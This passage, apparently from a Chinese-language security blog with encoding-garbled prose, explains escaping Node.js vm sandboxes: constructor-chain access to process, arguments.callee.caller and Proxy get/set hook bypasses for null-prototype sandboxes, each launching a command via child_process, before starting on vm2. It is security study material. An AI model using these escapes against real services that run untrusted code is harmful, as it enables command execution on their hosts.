class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">`process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)`</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¼¹è®¡ç®—å™¨äº†</p><blockquote><p>è¿™é‡Œäº†è§£ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™</p><ul><li><p>processï¼š</p><p>process å¯¹è±¡æ˜¯ Node.js æä¾›çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†æœ‰å…³å½“å‰ Node.js è¿›ç¨‹çš„ä¿¡æ¯å’Œæ§åˆ¶æ–¹æ³•ã€‚</p><p>process å¯¹è±¡å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œè€Œä¸éœ€è¦é€šè¿‡ require() å¼•å…¥ï¼Œæ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„å…¨å±€å¯¹è±¡ï¼Œç±»ä¼¼äº consoleã€globalã€Buffer ç­‰ã€‚</p><p>process å¯¹è±¡æœ‰å¾ˆå¤šæœ‰ç”¨çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p><ul><li><p>process.envï¼šå¯ä»¥è·å–æˆ–è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¦‚ process.env.NODE_ENVã€‚</p></li><li><p>process.argvï¼šå¯ä»¥è·å–å‘½ä»¤è¡Œå‚æ•°ï¼Œå¦‚ process.argv[0]ã€‚</p></li><li><p>process.cwd()ï¼šå¯ä»¥è·å–å½“å‰å·¥ä½œç›®å½•ï¼Œå¦‚ process.cwd()ã€‚</p></li><li><p>process.exit()ï¼šå¯ä»¥é€€å‡ºå½“å‰è¿›ç¨‹ï¼Œå¦‚ process.exit(0)ã€‚</p></li><li><p>process.mainModuleï¼š æ˜¯ Node.js æä¾›çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºå½“å‰ä¸»æ¨¡å—çš„ Module å®ä¾‹ï¼Œä¸»æ¨¡å—å°±æ˜¯nodeæ‰§è¡Œçš„jsã€‚</p><p>å®ƒå¯ä»¥è®©ä½ è·å–å½“å‰ä¸»æ¨¡å—çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å®ƒçš„æ–‡ä»¶åã€è·¯å¾„ã€å­æ¨¡å—ç­‰ï¼Œæ¯”å¦‚process.mainModule.requireã€‚</p></li></ul></li><li><p>å› ä¸ºæ²™ç®±ä¸­æ²¡æœ‰ require() å‡½æ•°ï¼Œè¿™æ˜¯ Node.js çš„ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç”¨äºåŠ è½½æ¨¡å—ï¼Œä½†å®ƒä¸æ˜¯ global å¯¹è±¡ä¸Šçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ˜¯åœ¨æ¯ä¸ªæ¨¡å—çš„æœ¬åœ°ä½œç”¨åŸŸä¸­å®šä¹‰çš„ã€‚ä»ä¸Šé¢çš„ä½œç”¨åŸŸå¯ä»¥çŸ¥é“ï¼Œrequireå°±æ˜¯åœ¨nodeæ‰§è¡Œçš„jså†…å®šä¹‰çš„å‡½æ•°ï¼Œè€Œæ²™ç®±å†…éƒ¨å°±æ˜¯å¦ä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼Œæ‰€ä»¥æ˜¯æ²¡æœ‰requireå‡½æ•°çš„ï¼Œéœ€è¦ä»process.mainModuleä¸­è·å–ã€‚</p></li></ul></blockquote></li><li><p><strong>vm.runInContext(code, contextifiedSandbox[, options])</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> code=<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)();&#x27;</span>;<br><span class="hljs-comment">//vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);è¿™æ ·è·å–processå¯¹è±¡ä¹Ÿæ˜¯å¯ä»¥çš„</span><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInContext</span>(code,sandbox);<br>res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¯¥æ–¹æ³•çš„ä½œç”¨åŸŸæ˜¯ç‹¬ç«‹äºglobalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·å–globalçš„processå¯¹è±¡ï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><blockquote><p>è§£é‡Šä¸€ä¸‹æ˜¯æ€ä¹ˆè·å–processå¯¹è±¡çš„ï¼š</p><p>åœ¨æ²™ç®±ä¸­thisæŒ‡å‘å…¨å±€ç¯å¢ƒä¸­çš„{x:2}å¯¹è±¡ï¼Œè¿™é‡Œé€šè¿‡è°ƒè¯•å¯ä»¥çœ‹åˆ°</p><p><img src="http://cdn.clown2024.cn/202407151754025.png" alt="image-20240310094536377"></p><p>è¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œå®ƒå±äºå…¨å±€ç¯å¢ƒï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„<code>()</code>æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªæ„é€ å™¨é“¾çš„å›¾ä¾‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151754026.png" alt="image-20240309170145802"></p><p>æ‰€ä»¥ä¸Šé¢çš„toStringå’Œconstructoréƒ½æ˜¯Object.prototypeä¸Šçš„å±æ€§ï¼Œæ‰€ä»¥è¿™ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ã€‚</p><p>æ„é€ å™¨é“¾çš„å°½å¤´æ˜¯<code>Function</code>ï¼ŒFunctionçš„æ„é€ å™¨æ˜¯Functionæœ¬èº«ï¼Œæ‰€ä»¥åˆ©ç”¨åŸå‹é“¾è°ƒç”¨Functionçš„æ„é€ å‡½æ•°ä¹‹åå°±èƒ½è·å¾—processå¯¹è±¡ã€‚</p></blockquote><p>æ‰€ä»¥åªè¦æ˜¯thisæ˜¯å¤–éƒ¨çš„å¼•ç”¨éƒ½æ˜¯å¯ä»¥æ¥è¿›è¡Œé€ƒé€¸çš„ï¼Œæ‰€ä»¥ä¸‹é¢è¿™æ ·å†™ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = &#123;<br>    <span class="hljs-attr">x</span>: []<br>&#125;;<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">&#x27;x.constructor.constructor(&quot;return process&quot;)()&#x27;</span>,sandbox);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><blockquote><p>ä½†æ˜¯å¦‚æœxæ˜¯æ˜¯æ•°å­—ã€å­—ç¬¦ä¸²ç­‰primitiveç±»å‹å°±æ— æ³•é€ƒé€¸å‡ºæ¥ï¼Œå› ä¸ºä»–ä»¬åœ¨ä¼ å‚çš„æ—¶å€™å°†æ•°å€¼ä¼ é€’è¿‡å»ï¼Œè€Œä¸æ˜¯å¼•ç”¨å±æ€§ï¼Œæ— æ³•è¿›ä¸€æ­¥è°ƒç”¨<code>constructor</code></p></blockquote></li><li><p><strong>runInNewContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)();&#x27;</span>;<br><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInNewContext</span>(code);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><p>åŸç†å’Œä¸Šé¢çš„runInContextä¸€æ ·ã€‚</p></li><li><p><strong>new vm.Script(code, options)</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;</span>)<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">x</span>:[]&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒåŒç†ã€‚</p></li></ul><h2 id="vmç»•è¿‡objectcreatenull"><a href="#vmç»•è¿‡Object-create-null" class="headerlink" title="vmç»•è¿‡Object.create(null)"></a>vmç»•è¿‡Object.create(null)</h2><p>å½“æˆ‘ä»¬çš„sandboxæ²™ç®±å¯¹è±¡è®¾ç½®ä¸ºnullæ—¶ï¼Œå°±æ— æ³•é€šè¿‡this.construtoræ¥è·å–Functionçš„æ„é€ å‡½æ•°</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&quot;this.constructor.constructor(&#x27;return process&#x27;)().env&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">runInContext</span>(code,sandbox));<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‡½æ•°å°±ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯</p><p><img src="http://cdn.clown2024.cn/202407151754027.png" alt="image-20240309183122332"></p><p>ç»•è¿‡ä¸€ç§æ–¹æ³•å°±æ˜¯åˆ©ç”¨<strong>arguments.callee.caller</strong></p><p>è¿™é‡Œäº†è§£ä¸€ä¸‹argumentsæ˜¯ä»€ä¹ˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">arguments æ˜¯ä¸€ä¸ªç±»æ•°ç»„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¼ é€’ç»™å½“å‰å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚<br><br>arguments.callee æ˜¯ arguments å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒè¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°æœ¬èº«ã€‚<br><br>arguments.callee.caller æ˜¯ arguments.callee å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒè¡¨ç¤ºè°ƒç”¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°çš„é‚£ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨å½“å‰å‡½æ•°çš„å¤–éƒ¨å‡½æ•°ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">foo</span>();<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">bar</span>();<br>&#125;<br><span class="hljs-title function_">foo</span>();<br><span class="hljs-title function_">bar</span>();<br><span class="hljs-title function_">baz</span>();<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754028.png" alt="image-20240309183741062"></p><p>é‚£æ€è·¯å°±æ˜¯åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„arguments.callee.calleråˆ™ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æˆ‘ä»¬å°±å¯ä»¥åœ¨æ²™ç®±å†…è¿›è¡Œé€ƒé€¸äº†</p><p>é‚£ä¹ˆä¸‹é¢çš„å†™æ³•å°±å¯ä»¥è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125;</span><br><span class="hljs-string">    a.toString = function () &#123;</span><br><span class="hljs-string">      const cc = arguments.callee.caller;</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> + res);<br></code></pre></td></tr></table></figure><blockquote><p>è¯´ä¸€ä¸‹å¤§æ¦‚æµç¨‹ï¼š</p><p>è¿™é‡Œåœ¨æ²™ç®±å†…å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°å°†toString()è¿›è¡Œäº†é‡å†™ï¼Œæˆ‘ä»¬åœ¨vm.runInContext(func, context)è¿™é‡Œæ‰§è¡Œäº†è¯¥å‡½æ•°é‡å†™toStringåè¿”å›äº†æ²™ç®±å†…çš„aå¯¹è±¡ï¼Œç„¶åconsole.logçš„æ—¶å€™é»˜è®¤æ‰§è¡Œäº†toString()æ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™ccè·å¾—çš„å°±æ˜¯å¤–éƒ¨æ‰§è¡Œå¯¹è±¡ï¼Œç„¶åæˆ‘ä»¬å°±æˆåŠŸè¿›è¡Œäº†é€ƒé€¸ã€‚</p><p>è¿™é‡Œä¹Ÿå¯ä»¥è‡ªå·±å»è°ƒè¯•ä¸€ä¸‹ä¼šæ›´åŠ æ¸…æ™°ã€‚</p></blockquote><p>å¦‚æœæ— æ³•é‡å†™æˆ–è§¦å‘toString()æ–¹æ³•ï¼Œè¿˜å¯ä»¥åˆ©ç”¨<strong>Proxy</strong>æ¥åŠ«æŒå±æ€§</p><p><strong>è¿™é‡Œäº†è§£ä¸€ä¸‹Proxyï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Proxy å¯¹è±¡æ˜¯ JavaScript æä¾›çš„ä¸€ä¸ªå†…ç½®å¯¹è±¡ï¼Œå®ƒå¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªä»£ç†ï¼Œç”¨äºæ‹¦æˆªå’Œä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„ä¸€äº›åŸºæœ¬æ“ä½œï¼Œä¾‹å¦‚å±æ€§çš„è¯»å–ã€èµ‹å€¼ã€åˆ é™¤ã€æšä¸¾ã€å‡½æ•°çš„è°ƒç”¨ç­‰<br><br>Proxy å¯¹è±¡çš„ç”¨æ³•æ˜¯ï¼š<br><br>åˆ›å»ºä¸€ä¸ª Proxy å¯¹è±¡ï¼Œéœ€è¦ä½¿ç”¨ new Proxy(target, handler) æ„é€ å‡½æ•°ï¼Œä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ç›®æ ‡å¯¹è±¡å’Œå¤„ç†å™¨å¯¹è±¡ã€‚<br>ç›®æ ‡å¯¹è±¡æ˜¯è¦è¢«ä»£ç†çš„å¯¹è±¡ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼Œä¾‹å¦‚æ•°ç»„ã€å‡½æ•°ã€å¦ä¸€ä¸ªä»£ç†ç­‰ã€‚<br>å¤„ç†å™¨å¯¹è±¡æ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡ï¼Œå®ƒå®šä¹‰äº†ä¸€äº›æ‹¦æˆªå‡½æ•°ï¼ˆä¹Ÿç§°ä¸ºé™·é˜±ï¼‰ï¼Œç”¨äºæ‹¦æˆªå’Œä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„åŸºæœ¬æ“ä½œã€‚<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//get</span><br><span class="hljs-keyword">let</span> numbers=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br>numbers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers,&#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>        <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> target) &#123;<br>          <span class="hljs-keyword">return</span> target[prop];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// é»˜è®¤å€¼</span><br>        &#125;<br>      &#125;<br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">1</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">123</span>]);<br><br><span class="hljs-comment">//set</span><br><span class="hljs-keyword">let</span> numbers1 = [];<br><br>numbers1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers1, &#123; <span class="hljs-comment">// (*)</span><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, val</span>) &#123; <span class="hljs-comment">// æ‹¦æˆªå†™å…¥æ“ä½œ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(val) == <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>      target[prop] = val;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>&#125;);<br><br>tmp=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;ceshi&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp));<br>tmp1=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp1));<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯åˆ©ç”¨geté’©å­å’Œseté’©å­æ¥è¿›è¡Œé€ƒé€¸çš„ä¾‹å­</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//åˆ©ç”¨geté’©å­é€ƒé€¸</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> script =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„åŸç†å°±æ˜¯åœ¨æ²™ç®±å¤–éƒ¨è®¿é—®äº†ä»£ç†å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œå³ä½¿å±æ€§ä¸å­˜åœ¨ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨é’©å­å‡½æ•°ï¼Œè¿™æ ·å°±å’Œä¸Šé¢ä¸€æ ·å¾—åˆ°äº†å¤–éƒ¨å¯¹è±¡ç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//åˆ©ç”¨seté’©å­</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        set: function(my,key, value) &#123;</span><br><span class="hljs-string">        (value.constructor.constructor(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br>res[<span class="hljs-string">&#x27;&#x27;</span>]=&#123;&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„åŸç†å°±æ˜¯ä¸ºä»£ç†å¯¹è±¡æ·»åŠ å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨seté’©å­ï¼Œé‚£ä¹ˆå°±è¾¾åˆ°äº†è·å–å¤–éƒ¨å¯¹è±¡çš„ç›®çš„ï¼Œç„¶åæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸Šé¢çš„è¿‡ç¨‹ä¹Ÿå¯ä»¥å»è°ƒè¯•ä¸€ä¸‹ä»£ç ä¼šæ›´åŠ æ¸…æ™°è¿è¡Œè¿‡ç¨‹ã€‚</p><h1 id="vm2æ²™ç®±é€ƒé€¸"><a href="#vm2æ²™ç®±é€ƒé€¸" class="headerlink" title="vm2æ²™ç®±é€ƒé€¸"></a>vm2æ²™ç®±é€ƒé€¸</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQuD=CNcDID&alichlgref=https://www.google.com/#toc-3">NodeJS VMå’ŒVM2æ²™ç®±é€ƒé€¸ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>vm2çš„å…·ä½“å®ç°åŸç†å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/207283">vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>vm2åœ¨vmçš„åŸºç¡€ä¸Šè¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯åˆ©ç”¨äº†Proxyä»£ç†ï¼Œä½¿ç”¨é’©å­æ‹¦æˆªconstructorå’Œ__ proto __è¿™äº›å±æ€§çš„è®¿é—®ã€‚</p><p>ç½‘ä¸Šçœ‹å¥½åƒvm2çš„ä»£ç åœ¨3.9ç‰ˆæœ¬ä¹‹åå¤§å¹…ä¿®æ”¹ï¼Œç»“æ„å˜æˆä¸‹é¢è¿™æ ·</p><p><img src="http://cdn.clown2024.cn/202407151754029.png" alt="image-20240310022305060"></p><p>å’Œä¸Šé¢çš„æ–‡ç« æ–‡ä»¶ç»“æ„éƒ½ä¸ä¸€æ ·ï¼Œä¸è¿‡ä½¿ç”¨çš„æ–¹æ³•æ²¡æœ‰å˜åŒ–ã€‚</p><p>æˆ‘ä»¬ç”¨åˆ°çš„vm2çš„æ²™ç®±ç¯å¢ƒæ˜¯é€šè¿‡main.jså¯¼å‡ºçš„VMå’ŒNodeVMï¼Œè¿˜æœ‰ä¸€ä¸ªVMScriptæ˜¯å°è£…äº†vm.Script</p><p><img src="http://cdn.clown2024.cn/202407151754030.png" alt="image-20240310100756542"></p><p>vm2æ‰§è¡Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//vm2</span><br><span class="hljs-keyword">const</span>&#123;<span class="hljs-variable constant_">VM</span>,<span class="hljs-title class_">VMScript</span>&#125;=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-comment">//è§£æ„èµ‹å€¼ï¼Œä»ä¸­æå–vm2çš„VMå’ŒVMScript</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><blockquote><p>VM æ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–ä¹‹åè°ƒç”¨ <code>run</code> æ–¹æ³•å³å¯è¿è¡Œä¸€æ®µè„šæœ¬ã€‚</p></blockquote><p>ä¸Šè¿°ä»£ç çš„å…·ä½“è¿è¡ŒåŸç†æˆ‘å°±è´´ä¸ªå›¾ï¼Œå…·ä½“çš„è¦å»çœ‹æ–‡ç« ï¼Œå› ä¸ºä»£ç 